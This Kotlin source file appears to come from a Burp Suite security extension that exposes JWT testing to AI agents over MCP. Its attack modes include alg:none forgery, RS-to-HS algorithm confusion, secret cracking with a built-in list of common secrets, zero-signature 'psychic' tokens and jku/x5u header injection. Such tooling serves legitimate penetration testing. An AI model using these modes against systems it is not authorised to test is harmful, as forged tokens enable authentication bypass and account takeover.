package io.bitbytelab.raijin.bridge

import io.bitbytelab.raijin.jwt.Jwt
import io.bitbytelab.raijin.jwt.JwtJose
import io.bitbytelab.raijin.jwt.JwtKey
import io.bitbytelab.raijin.jwt.JwtKeyRing
import io.bitbytelab.raijin.jwt.jwkTextToPem
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonObjectBuilder
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonArray
import kotlinx.serialization.json.putJsonObject

/**
 * MCP-facing wrapper over [Jwt] and the JWK ring. No Montoya types.
 * [load] and [save] persist the ring (extension data). Both are null in unit tests.
 * The ring calls [save] itself, under its write lock, after every change.
 */
class JwtBridge(
    load: (() -> String?)? = null,
    save: ((String) -> Unit)? = null,
) {
    private val ring = JwtKeyRing(save)

    init {
        try {
            load?.invoke()?.takeIf { it.isNotBlank() }?.let { ring.restore(it) }
        } catch (_: Exception) {
            // A corrupt ring must not stop the extension from loading.
        }
    }

    /**
     * Runs a JWT [mode] against [token]:
     *  - `analyze`        — decode + flag alg family, kid/jku, exp, claims a strict parser rejects.
     *  - `forge_none`     — alg:none variants with an empty signature.
     *  - `alg_confusion`  — RS->HS confusion: sign with [publicKey] as the HMAC secret.
     *  - `crack`          — recover the HMAC secret from [wordlist] (or a built-in list).
     *  - `sign`           — HMAC re-sign with [secret].
     *  - `sign_key`       — sign with key ring id [keyId].
     *  - `verify`         — verify with [keyId], or every key when [keyId] is omitted.
     *  - `encrypt` / `decrypt` — JWE with [keyId].
     *  - `embed_jwk`      — sign and embed the public JWK.
     *  - `empty_hmac`     — HMAC with an empty secret.
     *  - `psychic`        — ES* token with a zero ECDSA signature.
     *  - `header_url`     — set `jku` or `x5u` to [url]. With [keyId] the token is signed with that
     *                       key and the result carries the JWK set / certificate chain to serve at [url].
     *
     * Every signing mode keeps the payload's bytes unless [overrides] names claims, which are then
     * written into the payload's JSON text in place.
     */
    fun attack(
        token: String,
        mode: String,
        secret: String?,
        publicKey: String?,
        wordlist: List<String>?,
        overrides: JsonObject?,
        alg: String?,
        keyId: String? = null,
        enc: String? = null,
        header: String? = null,
        url: String? = null,
    ): JsonObject {
        return try {
            when (mode.trim().lowercase()) {
                "analyze" -> analyze(token)
                "forge_none" -> {
                    val variants = Jwt.forgeNone(token, overrides)
                    if (variants.isEmpty()) return err("Not a decodable JWT")
                    buildJsonObject {
                        put("variants", buildJsonArray { variants.forEach { add(it) } })
                        put("note", "Send each variant; if one is accepted, the server does not verify signatures.")
                    }
                }
                "alg_confusion" -> {
                    // publicKey is used as literal HMAC-secret bytes by Jwt.resign, so it needs
                    // byte-exact PEM text. key_id reuses the ring key's own PEM export; a raw
                    // publicKey that looks like JWK JSON is converted the same way, so a JWKS
                    // entry can be pasted directly instead of round-tripping through jwt_keys
                    // import -> export format=pem by hand.
                    val key = when {
                        keyId != null -> joseKey(keyId).exportPem(includePrivate = false)
                        publicKey == null -> return err("alg_confusion requires public_key (PEM text or JWK/JWK-set JSON) or key_id")
                        publicKey.trim().startsWith("{") -> try {
                            jwkTextToPem(publicKey)
                        } catch (e: Exception) {
                            return err("Could not parse public_key as JWK JSON: ${e.message}")
                        }
                        else -> publicKey
                    }
                    val hmacAlg = (alg ?: "HS256").uppercase()
                    if (hmacAlg !in HMAC_ALGS) {
                        return err("alg_confusion signs with HMAC, so alg must be HS256, HS384 or HS512")
                    }
                    val forged = Jwt.resign(token, key, hmacAlg, overrides) ?: return err("Not a decodable JWT")
                    buildJsonObject {
                        put("token", forged)
                        put("note", "RS->HS confusion: signed with the public key as the HMAC secret. Works when the server uses one verify() across alg families.")
                    }
                }
                "crack" -> {
                    val raw = Jwt.split(token) ?: return err("Not a decodable JWT")
                    val tokenAlg = raw.alg
                    if (tokenAlg == null || tokenAlg.uppercase() !in HMAC_ALGS) {
                        return err("crack needs an HS256, HS384 or HS512 token; this one has alg ${tokenAlg ?: "missing"}")
                    }
                    val list = wordlist?.takeIf { it.isNotEmpty() } ?: DEFAULT_SECRETS
                    val found = Jwt.crack(token, list)
                    buildJsonObject {
                        put("cracked", found != null)
                        if (found != null) put("secret", found)
                        put("candidates_tried", list.size)
                        if (found == null) put("note", "No match. Supply a larger wordlist via the 'wordlist' argument.")
                    }
                }
                "sign" -> {
                    val s = secret ?: return err("sign requires 'secret'")
                    if (s.isEmpty()) return err("sign needs a non-empty secret; mode=empty_hmac signs with the empty one")
                    val hmacAlg = (alg ?: "HS256").uppercase()
                    if (hmacAlg !in HMAC_ALGS) {
                        return err("sign takes an HMAC secret, so alg must be HS256, HS384 or HS512. Use sign_key with key_id for $hmacAlg")
                    }
                    val signed = Jwt.resign(token, s, hmacAlg, overrides) ?: return err("Not a decodable JWT")
                    buildJsonObject { put("token", signed) }
                }
                "sign_key" -> {
                    val key = joseKey(keyId ?: return err("sign_key requires key_id"))
                    buildJsonObject { put("token", JwtJose.sign(token, key.jwk, alg, overrides)) }
                }
                "verify" -> verify(token, keyId)
                "encrypt" -> {
                    val id = keyId ?: return err("encrypt requires key_id")
                    val tokenOut = when (val key = ring.get(id)) {
                        is JwtKey.Jose -> JwtJose.encrypt(token, key.jwk, alg, enc)
                        is JwtKey.Password -> JwtJose.encryptPassword(token, key.password, alg, enc)
                    }
                    buildJsonObject { put("token", tokenOut) }
                }
                "decrypt" -> {
                    val id = keyId ?: return err("decrypt requires key_id")
                    val plain = when (val key = ring.get(id)) {
                        is JwtKey.Jose -> JwtJose.decrypt(token, key.jwk)
                        is JwtKey.Password -> JwtJose.decryptPassword(token, key.password)
                    }
                    buildJsonObject { put("plaintext", plain) }
                }
                "embed_jwk" -> {
                    val key = joseKey(keyId ?: return err("embed_jwk requires key_id"))
                    buildJsonObject { put("token", JwtJose.embedJwk(token, key.jwk, alg, overrides)) }
                }
                "empty_hmac" -> buildJsonObject { put("token", JwtJose.emptyHmac(token, alg, overrides)) }
                "psychic" -> buildJsonObject {
                    put("token", JwtJose.psychic(token, alg, overrides))
                    put("token_raw_rs", JwtJose.psychicRawRs(token, alg, overrides))
                    put("note", "token: DER-encoded zero signature; token_raw_rs: the same as JWS raw r||s zero bytes. Try both.")
                }
                "header_url" -> {
                    val target = url?.takeIf { it.isNotBlank() } ?: return err("header_url requires url")
                    if (keyId != null) {
                        hostedKey(token, joseKey(keyId), header, target, alg, overrides)
                    } else {
                        buildJsonObject {
                            put("token", JwtJose.headerUrl(token, header, target, overrides))
                            put(
                                "note",
                                "The signature is left as it was, so this only shows whether the target fetches the URL. " +
                                    "Pass key_id to sign with a ring key and get the document to serve there."
                            )
                        }
                    }
                }
                else -> err("Unknown mode '$mode'. Use: ${MODES.joinToString(" | ")}.")
            }
        } catch (e: Exception) {
            err("JWT operation failed: ${e.message ?: e.javaClass.simpleName}")
        }
    }

    /**
     * Key ring CRUD. [action] is generate, import, list, export, or delete.
     * [list] and the default [export] do not return private key bytes.
     */
    fun keys(
        action: String,
        kty: String? = null,
        size: Int? = null,
        crv: String? = null,
        alg: String? = null,
        keyId: String? = null,
        pem: String? = null,
        jwk: String? = null,
        password: String? = null,
        format: String? = null,
        includePrivate: Boolean = false,
    ): JsonObject {
        return try {
            when (action.trim().lowercase()) {
                "generate" -> {
                    val kind = kty ?: return err("generate requires kty")
                    val key = ring.generate(kind, size, crv, alg, keyId)
                    buildJsonObject {
                        put("key_id", key.id)
                        put("kty", key.kty)
                        key.alg?.let { put("alg", it) }
                        key.crv?.let { put("crv", it) }
                        key.publicJwk()?.let { put("public_jwk", it) }
                        putJsonArray("modes") { key.modes.forEach { add(it) } }
                        storeWarning()
                    }
                }
                "import" -> {
                    val imported = ring.import(pem, jwk, password)
                    buildJsonObject {
                        put("imported", buildJsonArray { imported.forEach { add(it.summary()) } })
                        storeWarning()
                    }
                }
                "list" -> buildJsonObject {
                    put("keys", buildJsonArray { ring.list().forEach { add(it.summary()) } })
                }
                "export" -> {
                    val id = keyId ?: return err("export requires key_id")
                    val key = ring.get(id)
                    val fmt = (format ?: "jwk").trim().lowercase()
                    buildJsonObject {
                        put("key_id", id)
                        put("format", fmt)
                        when (fmt) {
                            "jwk" -> when (key) {
                                is JwtKey.Jose -> put("jwk", key.exportJwk(includePrivate))
                                is JwtKey.Password -> {
                                    if (!includePrivate) return err("Key '$id' has no public form. Pass include_private=true to export it")
                                    put("jwk", key.exportPrivate())
                                }
                            }
                            "pem" -> when (key) {
                                is JwtKey.Jose -> put("pem", key.exportPem(includePrivate))
                                is JwtKey.Password -> return err("Password keys export as jwk only")
                            }
                            else -> return err("format must be jwk or pem")
                        }
                    }
                }
                "delete" -> {
                    val id = keyId ?: return err("delete requires key_id")
                    val deleted = ring.delete(id)
                    buildJsonObject {
                        put("key_id", id)
                        put("deleted", deleted)
                        if (deleted) storeWarning()
                    }
                }
                else -> err("Unknown action '$action'. Use: ${KEY_ACTIONS.joinToString(" | ")}.")
            }
        } catch (e: Exception) {
            err(e.message ?: "Key operation failed")
        }
    }

    /**
     * `header` and `payload` are the parsed view, which keeps one copy of a repeated member and
     * quotes a bare word. Whenever that view differs from what the token holds, `header_raw` /
     * `payload_raw` carry the text as it was sent.
     */
    private fun analyze(token: String): JsonObject {
        val raw = Jwt.split(token) ?: return err("Not a decodable JWT")
        val header = Jwt.printable(raw.header)
        val json = raw.payloadJson?.let(Jwt::printable)
        val text = raw.payloadText
        return buildJsonObject {
            put("header", header)
            if (header != raw.header || raw.repeatedHeaders.isNotEmpty()) put("header_raw", raw.headerText)
            when {
                json != null -> put("payload", json)
                text != null -> put("payload", text)
                else -> put("payload_bytes", raw.payloadBytes.size)
            }
            if (json != null && text != null && (json != raw.payloadJson || raw.repeatedClaims.isNotEmpty())) {
                put("payload_raw", text)
            }
            put("alg", raw.alg)
            put("issues", buildJsonArray {
                Jwt.analyze(token).forEach {
                    add(buildJsonObject {
                        put("id", it.id); put("severity", it.severity); put("detail", it.detail)
                    })
                }
            })
        }
    }

    private fun verify(token: String, keyId: String?): JsonObject {
        val selected = if (keyId != null) {
            listOf(ring.get(keyId))
        } else {
            ring.list()
        }
        val joseKeys = selected.filterIsInstance<JwtKey.Jose>()
        if (joseKeys.isEmpty()) {
            return err(if (keyId != null) "Key '$keyId' is a password and cannot verify a signature" else "No keys to verify with")
        }
        val rows = joseKeys.map { key -> key to JwtJose.check(token, key.jwk) }
        return buildJsonObject {
            put("valid", rows.any { it.second.valid })
            put("matches", buildJsonArray {
                rows.forEach { (key, result) ->
                    add(buildJsonObject {
                        put("key_id", key.id)
                        put("valid", result.valid)
                        result.reason?.let { put("reason", it) }
                    })
                }
            })
        }
    }

    /** `header_url` with a ring key: the signed token plus the document its URL has to serve. */
    private fun hostedKey(
        token: String,
        key: JwtKey.Jose,
        header: String?,
        url: String,
        alg: String?,
        overrides: JsonObject?,
    ): JsonObject {
        val hosted = JwtJose.headerUrlSigned(token, key.jwk, header, url, alg, overrides)
        return buildJsonObject {
            put("token", hosted.token)
            Jwt.split(hosted.token)?.let { put("header", Jwt.printable(it.header)) }
            put("key_id", key.id)
            putJsonObject("host") {
                put("url", hosted.url)
                put("content_type", hosted.contentType)
                put("body", hosted.document)
            }
            if (hosted.header == "jku") put("jwks", Json.parseToJsonElement(hosted.document))
            put(
                "note",
                "Serve host.body at host.url with that Content-Type, then send the token. It verifies only when " +
                    "the target fetches the ${hosted.header} URL and trusts the key it finds there."
            )
        }
    }

    private fun joseKey(id: String): JwtKey.Jose = when (val key = ring.get(id)) {
        is JwtKey.Jose -> key
        is JwtKey.Password -> throw IllegalArgumentException("Key '$id' is a password and cannot sign")
    }

    /** Says so when the ring's last change did not reach the store. */
    private fun JsonObjectBuilder.storeWarning() {
        ring.storeError?.let {
            put("warning", "The key ring could not be saved ($it). Its keys work until the extension unloads.")
        }
    }

    private fun err(msg: String): JsonObject = buildJsonObject { put("error", msg) }

    companion object {
        const val PERSIST_KEY = "raijin.jwt.keys"

        /** Values [attack] takes as `mode`. */
        val MODES: List<String> = listOf(
            "analyze", "forge_none", "alg_confusion", "crack", "sign", "sign_key", "verify",
            "encrypt", "decrypt", "embed_jwk", "empty_hmac", "psychic", "header_url",
        )

        /** Values [keys] takes as `action`. */
        val KEY_ACTIONS: List<String> = listOf("generate", "import", "list", "export", "delete")

        /** Headers `header_url` can write. */
        val URL_HEADERS: List<String> = listOf("jku", "x5u")

        /** Formats `export` can produce. */
        val EXPORT_FORMATS: List<String> = listOf("jwk", "pem")

        private val HMAC_ALGS = setOf("HS256", "HS384", "HS512")

        /** Small built-in wordlist for quick HS-secret cracking when none is supplied. */
        val DEFAULT_SECRETS = listOf(
            "secret", "password", "123456", "admin", "changeme", "your-256-bit-secret", "jwt", "token",
            "key", "secretkey", "supersecret", "test", "qwerty", "letmein", "private", "jwtsecret",
            "my-secret", "s3cr3t", "default", "root"
        )
    }
}
